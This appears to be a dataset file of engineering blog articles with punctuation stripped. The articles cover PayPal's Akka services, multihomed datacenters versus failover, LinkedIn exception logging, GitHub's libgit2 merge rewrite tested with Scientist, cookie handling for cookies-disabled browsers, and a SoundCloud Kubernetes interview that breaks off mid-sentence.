but once you get good at it  this approach can make code remarkably self documenting  Larger scale functions can read like a story  and the reader can choose which functions to dive into for more detail as she needs it   Acknowledgements Brandon Byars  Karthik Krishnan  Kevin Yeung  Luciano Ramalho  Pat Kua  Rebecca Parsons  Serge Gebhardt  Srikanth Venugopalan  and Steven Lowe discussed drafts of this post on our internal mailing list  Christian Pekeler reminded me that nested functions don t fit my sizing observations   Translations  Chinese,"[884 314 1205 795 1235 778 99 206 1225 800 1217]"
886,training-dataset/engineering/1098.txt,engineering,How PayPal Scaled to Billions of Transactions Daily Using Just 8VMsMonday  August 15  2016 at 8 56AM  How did Paypal take a billion hits a day system that might traditionally run on a 100s of VMs and shrink it down to run on 8 VMs  stay responsive even at 90  CPU  at transaction densities Paypal has never seen before  with jobs that take 1 10th the time  while reducing costs and allowing for much better organizational growth without growing the compute infrastructure accordingly   PayPal moved to an Actor model based on Akka  PayPal told their story here  squbs  A New  Reactive Way for PayPal to Build Applications  They open source squbs and you can find it here  squbs on GitHub   The stateful service model still doesn t get enough consideration when projects are choosing a way of doing things  To learn more about stateful services there s an article  Making The Case For Building Scalable Stateful Services In The Modern Era  based on an great talk given by Caitie McCaffrey  And if that doesn t convince you here s WhatsApp  who used Erlang  an Akka competitor  to achieve incredible throughput  The WhatsApp Architecture Facebook Bought For  19 Billion   I refer to the above articles because the PayPal article is short on architectural details  It s more about the factors the led the selection of Akka and the benefits they ve achieved by moving to Akka  But it s a very valuable motivating example for doing something different than the status quo   What s wrong with services on lots of VMs approach   Services use very small VMs and produce very low throughput for each VM  Actor based reactive systems shine at efficiently using compute resources  So you can shrink your system way down rather than rely on the typical auto scaling monstrosity   Actor based reactive systems shine at efficiently using compute resources  So you can shrink your system way down rather than rely on the typical auto scaling monstrosity  Puts a lot of pressure on network and routing infrastructure  As services tend to be interconnected  requests can go through a lot of hops  which increases latency and decreases the user experience   As services tend to be interconnected  requests can go through a lot of hops  which increases latency and decreases the user experience  Larger is more costly  Services spanning hundreds of VM have an high inherent cost in terms of management  monitoring  and ineffective caching   Services spanning hundreds of VM have an high inherent cost in terms of management  monitoring  and ineffective caching  Smaller is more agile  It takes a long time to deploy services across hundreds of VMs   It takes a long time to deploy services across hundreds of VMs  Make better use of more CPUs per VM   Since CPUs aren t getting faster your infrastructure needs to able efficiently exploit more CPUs per VM     Since CPUs aren t getting faster your infrastructure needs to able efficiently exploit more CPUs per VM  Microservices need to be built upon loosely coupled nanoservices that are easy to maintain and quick to build  You don t want layers and layers of complexity  You need good visibility into what a service does  You should not have to dig into layers and layers of code to figure it out   Given the above forces PayPal wanted a system with the following characteristics   Scalable  both horizontally to hundreds of nodes and vertically to very many processors  handling billions of requests per day  Low latency  controllable at a very fine grain  Resilient to failure  Flexibility in adjusting the service boundaries  A programming model AND culture encouraging scalability and simplicity  including clean failure and error handling   It s clear PayPal wanted a thinner stack  They didn t want a stack with lots of layers and moving parts  Akka and state based systems in general are good for that as they collapse a good chunk of the stack down to one technology  PayPal chose Akka over Erlang because they have a lot of Java experience and Akka runs on Java  For many having to learn Erlang is a non starter   With Akka they could   write code that is easy to reason about  write code that s easy to test  handle errors and failure scenarios more naturally when compared to the traditional model used on the JVM  write faster  resilient  and simpler code with streamlined error handling and fewer bugs  So of course PayPal immediately wrote their own framework on top of Akka  as one does  called squbs  rhymes with cubes  that creates a modular layer for building nano services called  cubes   Cubes are symmetric to other cubes  the interdependency between cubes are loose and symmetric  and only expose the messaging interface already provided in Akka   The article brings up the difficulty of programmers adapting to the non linear nature of Akka code  so you have to hire people that can be trained program in Akka Scala   Since most services do similar things  receive requests  make database calls to read write the database  make other service calls  call a rule engine  fetch data from cache  write to cache  they were able to abstract that out using patterns like the Orchestrator Pattern and Perpetual Stream   Squbs has become the standard for building Akka based reactive applications at PayPal  So if you haven t considered stateful systems for your team  give them another look  It has worked for PayPal  Facebook  Uber  and Microsoft   Related Articles,"[886 1309 1351 92 673 778 276 695 278 1335 61]"
889,training-dataset/engineering/1178.txt,engineering,Moving Beyond Legacy Disaster RecoveryTuesday  August 23  2016 at 4 42PM  Failover does not cut it anymore  You need an ALWAYS ON architecture with multiple data centers     Martin Van Ryswyk   VP of Engineering at DataStax  Failover  switching to a redundant or standby system when a component fails  has a long and checkered history as a way of dealing with failure  The reason is your failover mechanism becomes a single point of failure that often fails just when it s needed most  Having worked on a few telecom systems that used a failover strategy I know exactly how stressful failover events can be and how stupid you feel when your failover fails  If you have a double or triple fault in your system failover is exactly the time when it will happen   For a long time the only real trick we had for achieving fault tolerance was to have a hot  warm  or cold standby  disk  interface  card  server  router  generator  datacenter  etc   and failover to it when there s a problem  This old style of Disaster Recovery planning is no longer adequate or necessary   Now  thanks to cloud infrastructures  at least at a software system level  we have an alternative  an always on architecture  Google calls this a natively multihomed architecture  You can distribute data across multiple datacenters in such away that all your datacenters are always active  Each datacenter can automatically scale capacity up and down depending on what happens to other datacenters  You know  the usual sort of cloud propaganda  Robin Schumacher makes a good case here  Long live Dear CXO   When Will What Happened to Delta Happen to You   Recent Problems With Disaster  Recovery  Southwest had a service disruption a year ago and again was recently bit by a  once in a thousand year event  that caused a service outage  doesn t it seem like once in 1000 year events happen a lot more lately    The first incident was blamed on  legacy systems  that could no longer handle the increased load of a now much larger airline  The most recent problem was caused by a router partially failed so the failover mechanism didn t kick in  2 300 flights were canceled over four days at cost of perhaps  10 million  When you do your system s engineering review do you consider partial failures  Probably not  Yet they happen and are notoriously hard to detect and deal with   Sprint has also experienced bad backup problems   Sprint said a fire in D C  caused problems at Sprint s data center in Reston  Va  How a fire across the street from Sprint s switch in D C  caused issues 20 miles away wasn t quite clear  but apparently  emergency Sprint generators in D C  didn t kick in as they were supposed to and  as so often happens  one thing led to another   And unless you were on Mars  you will have heard Delta recently experienced their own failover problems  According to the flight captain of JFK SLC this morning  a routine scheduled switch to the backup generator this morning at 2 30am caused a fire that destroyed both the backup and the primary  Firefighters took a while to extinguish the fire  Power is now back up and 400 out of the 500 servers rebooted  still waiting for the last 100 to have the whole system fully functional  Delta has come under a lot of criticism  Why was the backup generator so close to the primary that a fire could destroy both  Why is the entire worldwide system running in a single datacenter  Why don t they test more  Why don t they have full failover to a backup datacenter  Why are they more interested in cutting costs the building a reliable system  Why do they still use those old mainframes  Why does a company that earns  42 billion a year have such crappy systems  It s only 500 servers  why not convert it to a cluster already  Why does management only care about their bonuses and cutting IT costs  Isn t that what you get from years out of outsourcing IT   There s a lot of venom  as you might expect  If you want a little background on Delta s systems then here s a good article  Delta Air Lines to Take Control of Its Data Systems  It appears that as of 2014 Delta spun in all its passenger service and flight operations systems  They had 180 proprietary Delta technology applications controlling their ticketing  website  flight check in  crew scheduling and more  And they spent about  250 million a year on IT   Does the whole system need a refactoring   Interesting comment on the technology involved in these systems from FormerRTCoverageAA   My advice is for ALL the major airlines to each put in about 10 million dollars  20 30 airlines would put a fund together about 200 300 million  to modernize and work on the Interfaces between them  and the hotel and car rental systems  tours  and other functions that SABRE Amadeus Apollo etc  interface to  This would fund a research consortium to look at the current technology  and DEFINE THE INTERFACES for the next generation system  Maybe HP and IBM and Microsoft and whoever else wants to play could put in some money too  The key for this consortium is to have the INTERFACES defined  Give the specifications to the vendors  HP  IBM  Microsoft  Google  Priceline  Hilton  Hertz  whoever  that want to build the next generation reservations system  Then let them have 1 year and all have to work to inter operate on the specification  just like they do on the  old  specs today for things like teletype  and last seat availability    This has worked well in the healthcare space in getting payers and providers to work together  Each potential vendor needs to plan to spend 10 50 million dollars on their proposed solution  Then  we have the inter operability technology fair  I would make it 2 weeks to 1 month  and each vendor can pitch to each airline  car rental  hotel  tour company  Uber  etc  Let each vendor do what he wants as long as the requirements for the specifications are met  Let the best tech vendor win   It s far past time to update these systems  Otherwise  more heartache pain and probably government bailouts to come  Possibly even larger travel and freight interruptions  A longer term blow up could put an airline out of business  Remember Eastern  I do    This all sounds like a great idea  but what could Delta do with its own architecture   The Always on Architecture  Earlier this year I wrote on article on a paper from Google  High Availability at Massive Scale  Building Google s Data Infrastructure for Ads that explains their history with Always On  It seems appropriate  Here s the article   The main idea of the paper is that the typical failover architecture used when moving from a single datacenter to multiple datacenters doesn t work well in practice  What does work  where work means using fewer resources while providing high availability and consistency  is a natively multihomed architecture   Our current approach is to build natively multihomed systems  Such systems run hot in multiple datacenters all the time  and adaptively move load between datacenters  with the ability to handle outages of any scale completely transparently  Additionally  planned datacenter outages and maintenance events are completely transparent  causing minimal disruption to the operational systems  In the past  such events required labor intensive efforts to move operational systems from one datacenter to another  The use of  multihoming  in this context may be confusing because multihoming usually refers to a computer connected to more than one network  At Google scale perhaps it s just as natural to talk about connecting to multiple datacenters   Google has built several multi homed systems to guarantee high availability  4 to 5 nines  and consistency in the presence of datacenter level outages  F1   Spanner  Relational Database  Photon  Joining Continuous Data Streams  Mesa  Data Warehousing  The approach taken by each of these systems is discussed in the paper  as are the many challenges is building a multi homed system  Synchronous Global State  What to Checkpoint  Repeatable Input  Exactly Once Output   The huge constraint here is having availability and consistency  This highlights the refreshing and continued emphasis Google puts on making even these complex systems easy for programmers to use   The simplicity of a multi homed system is particularly valuable for users  Without multi homing  failover  recovery  and dealing with inconsistency are all application problems  With multi homing  these hard problems are solved by the infrastructure  so the application developer gets high availability and consistency for free and can focus instead on building their application   The biggest surprise in the paper was the idea that a multihomed system can actually take far fewer resources than a failover system   In a multi homed system deployed in three datacenters with 20  total catchup capacity  the total resource footprint is 170  of steady state  This is dramatically less than the 300  required in the failover design above  What s Wrong With Failover   Failover based approaches  however  do not truly achieve high availability  and can have excessive cost due to the deployment of standby resources   Our teams have had several bad experiences dealing with failover based systems in the past  Since unplanned outages are rare  failover procedures were often added as an afterthought  not automated and not well tested  On multiple occasions  teams spent days recovering from an outage  bringing systems back online component by component  recovering state with ad hoc tools like custom MapReduces  and gradually tuning the system as it tried to catch up processing the backlog starting from the initial outage  These situations not only cause extended unavailability  but are also extremely stressful for the teams running complex mission critical systems   How do Multihomed Systems Work   In contrast  multi homed systems are designed to run in multiple datacenters as a core design property  so there is no on the side failover concept  A multi homed system runs live in multiple datacenters all the time  Each datacenter processes work all the time  and work is dynamically shared between datacenters to balance load  When one datacenter is slow  some fraction of work automatically moves to faster datacenters  When a datacenter is completely unavailable  all its work is automatically distributed to other datacenters   There is no failover process other than the continuous dynamic load balancing  Multi homed systems coordinate work across datacenters using shared global state that must be updated synchronously  All critical system state is replicated so that any work can be restarted in an alternate datacenter at any point  while still guaranteeing exactly once semantics  Multi homed systems are uniquely able to provide high availability and full consistency in the presence of datacenter level failures   In any of our typical streaming system  the events being processed are based on user interactions  and logged by systems serving user traffic in many datacenters around the world  A log collection service gathers these logs globally and copies them to two or more specific logs datacenters  Each logs datacenter gets a complete copy of the logs  with the guarantee that all events copied to any one datacenter will  eventually  be copied to all logs datacenters  The stream processing systems run in one or more of the logs datacenters and processes all events  Output from the stream processing system is usually stored into some globally replicated system so that the output can be consumed reliably from anywhere   In a multi homed system  all datacenters are live and processing all the time  Deploying three datacenters is typical  In steady state  each of the three datacenters process 33  of the traffic  After a failure where one datacenter is lost  the two remaining datacenters each process 50  of the traffic   Obviously Delta and other companies with extensive legacy systems are in a difficult position for this kind of approach  But if you consider IT something other than a cost center  and you plan to stay around for the long haul  and whole nations rely on the quality of your infrastructure  it s probably something you should consider  We have the technology   Related Articles,"[889 946 1373 1336 1351 92 778 500 615 204 278]"
890,training-dataset/engineering/605.txt,engineering,Inception  How LinkedIn Deals with Exception LogsCoauthors  Toon Sripatanaskul and Zhengyu Cai  In early 2012  the LinkedIn Performance team was trying to build a tool to validate the health of a service after code changes  a project that led us to build EKG  our canary monitoring system   I was assigned to look into ways to use logs to analyze a service s health  Back then  we had a script that copied log files from different machines  ran regular expressions over them  and then provided log reports  That system worked great at the time  However  LinkedIn was growing at a very rapid rate and the script was running into scaling issues   Log messages  especially exceptions  are good service health indicators  One very simple way to validate health of newly deployed services is to check if there is any new exception that shows up in a machine that is using the new code base  but not in the machines using the prior one  This sounds pretty straightforward to implement  but one of the biggest challenges for a company like LinkedIn is to scale this system for our multiple  large data centers  In this blog post  I will walk you through our journey dealing with this scaling challenge   Inception  in the beginning  In late 2012  we created a system to process all log messages called Inception  LinkedIn Exception   We gathered log information by having services in machines across our data centers emit log messages into Apache Kafka  Inception used Kafka consumers to process each event and then put data in the following database tables,"[890 1351 1046 778 1027 1405 1049 737 92 42 1403]"
895,training-dataset/engineering/261.txt,engineering,Move Fast and Fix ThingsAnyone who has worked on a large enough codebase knows that technical debt is an inescapable reality  The more rapidly an application grows in size and complexity  the more technical debt is accrued  With GitHub s growth over the last 7 years  we have found plenty of nooks and crannies in our codebase that are inevitably below our very best engineering standards  But we ve also found effective and efficient ways of paying down that technical debt  even in the most active parts of our systems   At GitHub we try not to brag about the  shortcuts  we ve taken over the years to scale our web application to more than 12 million users  In fact  we do quite the opposite  we make a conscious effort to study our codebase looking for systems that can be rewritten to be cleaner  simpler and more efficient  and we develop tools and workflows that allow us to perform these rewrites efficiently and reliably   As an example  two weeks ago we replaced one of the most critical code paths in our infrastructure  the code that performs merges when you press the Merge Button in a Pull Request  Although we routinely perform these kind of refactorings throughout our web app  the importance of the merge code makes it an interesting story to demonstrate our workflow   Merges in Git  We ve talked at length in the past about the storage model that GitHub uses for repositories in our platform and our Enterprise offerings  There are many implementation details that make this model efficient in both performance and disk usage  but the most relevant one here is the fact that repositories are always stored  bare    This means that the actual files in the repository  the ones that you would see on your working directory when you clone the repository  are not actually available on disk in our infrastructure  they are compressed and delta ed inside packfiles   Because of this  performing a merge in a production environment is a nontrivial endeavour  Git knows several merge strategies  but the recursive merge strategy that you d get by default when using git merge to merge two branches in a local repository assumes the existence of a working tree for the repository  with all the files checked out on it   The workaround we developed in the early days of GitHub for this limitation is effective  but not particularly elegant  instead of using the default git merge recursive strategy  we wrote our own merge strategy based on the original one that Git used back in the day  git merge resolve   With some tweaking  the old strategy can be adapted to not require an actual checkout of the files on disk   To accomplish this  we wrote a shell script that sets up a temporary working directory  in which the merge engine performs content level merges  Once these merges are complete  the files are written back into the original repository  together with the resulting trees   The core of this merge helper looks like this   git read  tree  i  m   aggressive  merge  base  head1  head2 git merge index git merge one file  a    exit 2 git write tree   3  This merges two trees in a bare repository rather effectively  but it has several shortcomings   It creates temporary directories on disk  hence  it needs to clean up after itself  It creates a temporary index on disk  which also requires cleanup  It is not particularly fast  despite Git s highly optimized merge engine  the old git merge one file script spawns several processes for each file that needs to be merged  The need to use disk as temporary scratch space also acts as a bottleneck  It doesn t have the exact same behavior as git merge in a Git client  because we re using an outdated merge strategy  as opposed to the recursive merge strategy that git merge now performs by default    Merges in libgit2  libgit2 is the sharpest weapon we own to fight any Git related technical debt in our platform  Building a web service around Git is notoriously hard  because the tooling of the Core Git project has been designed around local command line usage  and less thought has been put on the use case of running Git operations on the server side   With these limitations in mind  five years ago we began the development of libgit2  a re implementation of most of Git s low level APIs as a library that could be linked and used directly within a server side process  I personally led the development of libgit2 for the first 3 years of its existence  although right now the library is in the very capable hands of Carlos Mart n and Ed Thomson  It has also gained a lot of traction  with a solid stream of external contributions from other companies that also use it to build Git infrastructure   particularly our friends at Microsoft  who use it to implement all the Git functionality in Visual Studio   Despite being a C library  libgit2 contains many powerful abstractions to accomplish complex tasks that Git simply cannot do  One of these features are indexes that exist solely in memory and allow work tree related operations to be performed without an actual working directory  Based on this abstraction  Ed Thomson implemented an incredibly elegant merge engine as one of his first contributions to the library   With the in memory index  libgit2 is capable of merging two trees in a repository without having to check out any of their files on disk  On paper  this implementation is ideal for our use case  it is faster  simpler and more efficient than what we re currently doing with Git  But it is also a serious amount of new code that ought to replace some of the most critical functionality of our website   Trust issues  In this specific case  although I had thoroughly reviewed the merge implementation as libgit2 s maintainer  it would be reckless to assume it to be production ready  In fact  it would be even more reckless if I had written the whole implementation myself  The merge process is incredibly complex  in both the old and the new implementations  and GitHub operates at a scale where seemingly obscure  corner cases  will always happen by default  When it comes to user s data  ignoring corner cases is not an option   To make matters worse  this is not a new feature  this is a replacement for an existing feature which worked with no major issues  besides the technical debt and poor performance characteristics   There is no room for bugs or performance regressions  The switch over needs to be flawless and  just as importantly  it needs to be efficient   Efficiency is fundamental in these kind of projects because even with the performance improvements they entail  it becomes hard to justify the time investment if we cannot wrap up the refactoring in a tight timeframe   Without a clear deadline and a well defined workflow  it s easy to waste weeks of work rewriting code that will end up being buggier and less reliable than the old implementation  To prevent this  and to make these rewrites sustainable  we need to be able to perform them methodically in a virtually flawless fashion  This is a hard problem to tackle   Fortunately  this challenge is not unique to the systems code in GitHub  All of our engineering teams are just as concerned with code quality issues as we are  and for rewrites that interface with our main Rails app  like in this specific example  the PR merge functionality   our Core Application team has built extensive tooling that makes this extremely complicated process tenable   Preparing for an experiment  The first step of the rollout process of the new implementation was to implement the RPC calls for the new functionality  All the Git related operations in our platform happen through a service called GitRPC  which intelligently routes the request from the frontend servers and performs the operation on the fileserver where the corresponding repository is stored   For the old implementation  we were simply using a generic git_spawn RPC call  which runs the corresponding Git command  in this case  the script for our custom merge strategy  and returns the stdout   stderr and exit code to the frontend  The fact that we were using a generic spawn  instead of a specialized RPC call that performed the whole operation on the fileserver and returned the result  was another sign of technical debt  our main application required its own logic to parse and understand the results of a merge   Hence  for our new implementation  we wrote a specific create_merge_commit call  which would perform the merge operation in memory and in process on the fileserver side  The RPC service running on our fileservers is written in Ruby  just like our main Rails application  so all the libgit2 operations are actually performed using Rugged  the Ruby bindings for libgit2 which we develop in house   Thanks to the design of Rugged  which turns libgit2 s low level APIs into usable interfaces in Ruby land  writing the merge implementation is straightforward   def create_merge_commit   base   head   author   commit_message   base   resolve_commit   base   head   resolve_commit   head   commit_message   Rugged   prettify_message   commit_message   merge_base   rugged   merge_base   base   head   return   nil    already_merged    if merge_base    head   oid ancestor_tree   merge_base    Rugged    Commit   lookup   rugged   merge_base    tree merge_options      fail_on_conflict    true    skip_reuc    true    no_recursive    true     index   base   tree   merge   head   tree   ancestor_tree   merge_options   return   nil    merge_conflict    if   index   nil     index   conflicts    options      message    commit_message    committer    author    author    author    parents      base   head     tree    index   write_tree   rugged       Rugged    Commit   create   rugged   options    nil   end  Although GitRPC runs as a separate service on our fileservers  its source code is part of our main repository  and it is usually deployed in lockstep with the main Rails application in the frontends  Before we could start switching over the implementations  we merged and deployed the new RPC call to production  even though it was not being used anywhere yet   We refactored the main path for merge commit creation in the Rails app to extract the Git specific functionality into its own method  Then we implemented a second method with the same signature as the Git based code  but this one performing the merge commit through Rugged libgit2   Since deploying to production at GitHub is extremely straightforward  we perform about 60 deploys of our main application every day   I deployed the initial refactoring right away  That way we needn t worry about a potential gap in our extensive test suite  if the trivial refactoring introduced any issues in the existing behavior  they would be quickly spotted by deploying to a small percentage of the machines serving production traffic  Once I deemed the refactoring safe  it was fully deployed to all the frontend machines and merged into the mainline   Once we have the two code paths ready in our main application and in the RPC server  we can let the magic begin  we will be testing and benchmarking the two implementations  in production but without affecting in any way our existing users  thanks to the power of Scientist   Scientist is a library for testing refactorings  rewrites and performance improvements in Ruby  It was originally part of our Rails application  but we ve extracted and open sourced it  To start our testing with Scientist  we declare an experiment and set the old code path as a control sample and the new code path as a candidate   def create_merge_commit   author   base   head   options       commit_message   options    commit_message       Merge    head   into    base     now   Time   current science  create_merge_commit  do   e   e   context  base    base   to_s    head    head   to_s    repo    repository   nwo e   use   create_merge_commit_git   author   now   base   head   commit_message     e   try   create_merge_commit_rugged   author   now   base   head   commit_message     end end  Once this trivial change is in place  we can safely deploy it to production machines  Since the experiment has not been enabled yet  the code will work just as it did before  the control  old code path  will be executed and its result returned directly to the user  But with the experiment code deployed in production  we re one button click away from making SCIENCE  happen   The SCIENCE  behind a merge commit  The first thing we do when starting an experiment is enable it for a tiny fraction  1   of all the requests  When an experiment  runs  in a request  Scientist does many things behind the scenes  it runs the control and the candidate  randomizing the order in which they run to prevent masking bugs or performance regressions   stores the result of the control and returns it to the user  stores the result of the candidate and swallows any possible exceptions  to ensure that bugs or crashes in the new code cannot possibly impact the user   and compares the result of the control against the candidate  logging exceptions or mismatches in our Scientist web UI   The core concept of Scientist experiments is that even if the new code path crashes  or gives a bad result  this will not affect users  because they always receive the result of the old code   With a fraction of all requests running the experiment  we start getting valuable data  Running an experiment at 1  is useful to catch the obvious bugs and crashes in the new code  we can visualize the performance graph to see if we re heading in a good direction  perf wise  and we can eyeball the mismatches graph to see if the new code is more or less doing the right thing  Once these problems are solved  we increase the frequency of experiments to start catching the actual corner cases   Shortly after the deploy  the accuracy graph shows that experiments are being run at the right frequency and that mismatches are very few  Graphing the errors mismatches on their own shows their frequency in more detail  Our tooling captures metadata all these mismatches so they can be analyzed later  Although it s too early to tell  shortly after the initial deploy the performance characteristics look extremely promising  The vertical axis is time  in milliseonds  Percentiles for the old and new code are shown in blue and green  respectively   The main thing we noticed looking at experiment results is that a majority of mismatches came from the old code timing out whilst the new code succeeded in time  This is great news   it means we re solving a real performance issue with user facing effect  not only making a graph look prettier   After ignoring all experiments where the control was timing out  the remaining mismatches were caused by differing timestamps in the generated commits  our new RPC API was missing a  time  argument  the time at which the merge commit was created   and was using the local time in the fileserver instead  Since the experiment is perfomed sequentially  it was very easy to end up with mismatched timestamps between the control and the candidate  particularly for merges that take more than 1s  We fixed this by adding an explicit time argument to the RPC call  and after deploying  all the trivial mismatches were gone from the graph   Once we had some basic level of trust in the new implementation  it was time to increase the percentage of requests for which the experiment runs  More requests leads to more accurate performance stats and more corner cases where the new implementation was giving incorrect results   Simply looking at the performance graph makes it obvious that  even though for the average case the new code is significantly faster than the old implementation  there are performance spikes that need to be handled   Finding the cause of these spikes is trivial thanks to our tooling  we can configure Scientist to log any experiments where the candidate takes longer than Xms to run  in our case we aimed at 5000ms   and let it run overnight capturing this data   We did that for 4 days  every morning waking up to a tidy list of cases where the result of the new code was different from the old code  and cases where the new code was just giving good results but running too slowly   Consequently  our workflow is straightforward  we fix the mismatches and the performance issues  we deploy again to production  and we continue running the experiments  until there are no mismatches and no slow runs  It is worth noting that we fix both performance problems and mismatches with no priority for either  the old adage of  make it work and then make it fast  is pointless here   and in all of GitHub s systems  If it s not fast  it is not working  at least not properly   As a sample  here are a few of the cases we fixed over these 4 days   Performance wise  we noticed a lot of merges that were  conflicts   i e  they could not be merged by either Git or libgit2   and yet libgit2 was taking a huge amount of time to declare the merge a conflict  3ms for Git vs more than 8s in libgit2  Tracing the execution of the two code paths we noticed the reason why Git was so fast  our Git shell script was exiting as soon as it found a conflict  whereas libgit2 would continue resolving the merge until it had the resulting full index with conflicts in it  We have no use for an index with conflicts on it  so the solution to this performance issue was simple  adding a flag to make libgit2 abort the merge as soon as it finds any conflicts   We also found a serious O n  algorithm issue in libgit2  the code to write the REUC  an extension on the index that contains extra information   usually for Git GUIs  was taking too long to run in large repositories  There is no use for the REUC in our implementation  because we discard the index directly after having written the tree and commit  so we fixed the issue by adding a flag to libgit2 that skips writing the REUC altogether  While we were in the codebase  however  we fixed the O n  issue in the REUC and made it run hundreds of times faster   The first issue we found that was a mismatch in the results instead of a performance problem was a series of merges that Git was completing succesfully but libgit2 was marking as conflicts  All the mismatched merges had the same case  the ancestor had a file with a given filemode  whilst one side of the merge had removed the file and the other side had changed the filemode  This kind of situation should be marked as a conflict  but Git was erroneously resolving the merge and removing the file from the merge result  ignoring the fact that one side of the merge had changed the filemode of the same file   When comparing the code in libgit2 and Git for these operations  we noticed that the old merge strategy in Git was simply not handling the case properly and libgit2 was  So we fixed the bug upstream in Git and moved on   A much more interesting case happened when a merge that was clearly a conflict in libgit2 was being merged successfuly by Git  After some debugging  we found that the merge that Git was generating was broken   the single file that was being merged was definitely not a valid merge  and it even included conflict markers in the output  It took a bit more digging to find out the reason why Git was  successfully  merging this file  We noticed that the file in question happened to have exactly 768 conflicts between the old and the new version  This is a very peculiar number  The man page for git merge one file confirmed our suspicions  The exit value of this program is negative on error  and the number of conflicts otherwise  If the merge was clean  the exit value is 0  Given that shells only use the lowest 8 bits of a program s exit code  it s obvious why Git could merge this file  the 768 conflicts were being reported as 0 by the shell  because 768 is a multiple of 256  This bug was intense  But one more time  libgit2 was doing the right thing  so again we fixed the issue upstream in Git and continued with the experiments   The last interesting case was a merge that was apparently trivial to Git and sparking thousands of conflicts under libgit2  It took us a while to notice that the reason libgit2 couldn t merge was because it was picking the wrong merge base  Tracing the execution of libgit2 and Git in parallel  we noticed that libgit2 was missing a whole step in the merge base calculation algorithm  redundant merge base simplification  After implementing the extra step of the algorithm  libgit2 was resolving the same merge base as Git and the final merge was identical  We finally found a bug in libgit2  although in this case more than a bug it was a whole feature which we forgot to implement   Conclusion  After 4 days of iterating on this process  we managed to get the experiment running for 100  of the requests  for 24 hours  and with no mismatches nor slow cases during the whole run  In total  Scientist verified tens of millions of merge commits to be virtually identical in the old and new paths  Our experiment was a success   The last thing to do was the most exciting one  remove the Scientist code and switch all the frontend machines to run the new code by default  In a matter of hours  the new code was deployed and running for 100  of the production traffic in GitHub  Finally  we removed the old implementation   which frankly is the most gratifying part of this whole process   To sum it up  In roughly 5 days of part time work  we ve replaced one of GitHub s more critical code paths with no user visible effects  As part of this process  we ve fixed 2 serious merge related bugs in the original Git implementation which had gone undetected for years  and 3 major performance issues in the new implementation  The 99th percentile of the new implementation is roughly equivalent to the 95th of the old implementation   This kind of aggressive technical debt cleanup and optimization work can only happen as a by product of our engineering ecosystem  Without being able to deploy the main application more than 60 times in a day  and without the tooling to automatically test and benchmark two wildly different implementations in production  this process would have taken months of work and there would be no realistic way to ensure that there were no performance or behavior regressions,"[895 579 713 1225 1326 1008 206 1399 778 520 683]"
897,training-dataset/engineering/1428.txt,engineering,Node JS Single Page Apps   handling cookies disabled modeLet s break down the problem statement into its constituents   We need an alternative to the browser s cookie jar to persist the cookies in the front end  We need a mechanism to send these cookies as part of every AJAX request to the server and to ensure that the new cookies being set in the response are again persisted in the alternative storage  mentioned in 1 above    For the first one since our app is a JavaScript powered heavy weight SPA the ideal location for the persisted cookies is in the Front End JS context  Hence we wrote a client side JS script that took care of persisting the cookies onto the front end   For the second  the client side JS uses a custom HTTP header to send across all the cookies as part of every AJAX request from the client  We ended up writing a Node JS middleware that intercepts every incoming request  reads the custom header  extracts all the cookies and populates them in the Cookies header for downstream middleware to consume   For setting the response cookies the middleware again fires whenever the response headers are being sent and it reads all Set Cookie headers  extracts the cookie name values and populates it in the custom HTTP header that out client side script understands   Note that this approach has certain limitations though   This approach works only for AJAX requests and not full page POST since it relies on being sent through custom HTTP headers  and being persisted in memory on a single page  Using the existing cookie header is off limits  It is not possible to set this header for AJAX requests  nor is it possible to read cookies for a response when they are set as HttpOnly  As such  we use a x cookies header instead  We do not want javascript to have free reign over these cookies  given that most of them are designed to be HttpOnly  Hence  we encrypt all cookies on the way out  and decrypt them on the way back in  So cookies are now transparently handled on the front end  We rely on the front end to tell us when it s in cookies disabled mode  For the initial page render  we provide res _cookies for the renderer to drop on the page  The alternative is making an additional AJAX request  in order to get the x cookies object in headers  Since the browser can no longer expire cookies on outgoing responses  we can instead do this on incoming requests  by encoding the expiry time into the encrypted cookie value  Also  we can set a hard ceiling on this expiry time of 20 minutes  given that the cookies are only intended to exist until the user is redirected from the page   Using this approach of persisting cookies in client side JS context and sending them to the backend server via HTTP headers has scaled pretty well for us  This middleware can ideally be used as a supplement prior to any cookie parser middleware so as to enable reading and setting cookies by the app even for cookie disabled browsers   Credits to Daniel Brain who is the original author of memcookies   You can checkout the memcookies middleware and the bundled client side JS along with their usage in the above linked repo  Pull Requests Issues are welcome for suggestions and  or  improvements,"[897 576 1300 1347 1101 150 1422 1351 298 1393 733]"
899,training-dataset/engineering/164.txt,engineering,Transition to microservices while running under full steam is not easy Interview with Fabian Reinartz and Bj rn Rabenstein  SoundCloud s architecture started as a Ruby on Rails monolith  which later had to be broken into microservices to cope with the growing size and complexity of the site  Recently  the company has started to migrate to Kubernetes  We talked to JAX DevOps speakers Fabian Reinartz and Bj rn Rabenstein about the current Prometheus setup at SoundCloud and what it s like to monitor a large scale Kubernetes cluster   In this interview  Fabian Reinartz  an engineer at CoreOS and one of the Prometheus core developers and Bj rn Rabenstein the team lead of Production Engineering at SoundCloud  speakers at next week s JAX DevOps  are talking about how Prometheus and Kubernetes are a match made in open source heaven and demonstrating the current Prometheus setup at SoundCloud  monitoring a large scale Kubernetes cluster   JAXenter  SoundCloud has broken up its Ruby on Rails based monolith into microservices  What was the reason for that   Fabian Reinartz and Bj rn Rabenstein  It is the old story  Starting with a single  monolithic Ruby on Rails application is a great idea for startups  You get something going soon  and you can iterate quickly  But in the unlikely case that your startup is a success and suddenly has a lot of users  you quickly hit scalability limits  Also  growing complexity of the monolith slows down your iteration speed  That happened at SoundCloud  Resource usage hit us left and right  and launching a new feature became a more and more painful and arcane process   JAXenter  How would you describe your experiences  What worked well  what caused problems   Fabian Reinartz and Bj rn Rabenstein  Obviously  a transition to microservices while running under full steam is not easy  We decided against a big bang migration  and remnants of the old monolith  affectionately called  the Mothership   are still around today  If you want to learn more about the details  there are a number of talks out there to watch  and posts on our tech blog  Here are some recommendations     For the subject of our talk  the most relevant aspects are   1  How to run the many small applications that are part of a microservice architecture and  2  how to monitor those many small applications in a scalable and meaningful way  For the first part  we created Bazooka  a Heroku like in house platform to build  deploy  and manage containerized applications  For  2   we created Prometheus  While Bazooka is now being replaced by Kubernetes  Prometheus became an industry wide success and is now used by more than a hundred organizations   JAXenter  Why did you opt for Kubernetes   Fabian Reinartz and Bj rn Rabenstein  Instead of maintaining and improving Bazooka  we decided last year to replace it by one of the quickly developing open source alternatives that have entered the field after we had created Bazooka  We created a gigantic feature matrix to compare our options  Kubernetes only won by a small margin  but it did so as a relatively young project with a lot of anticipated development still 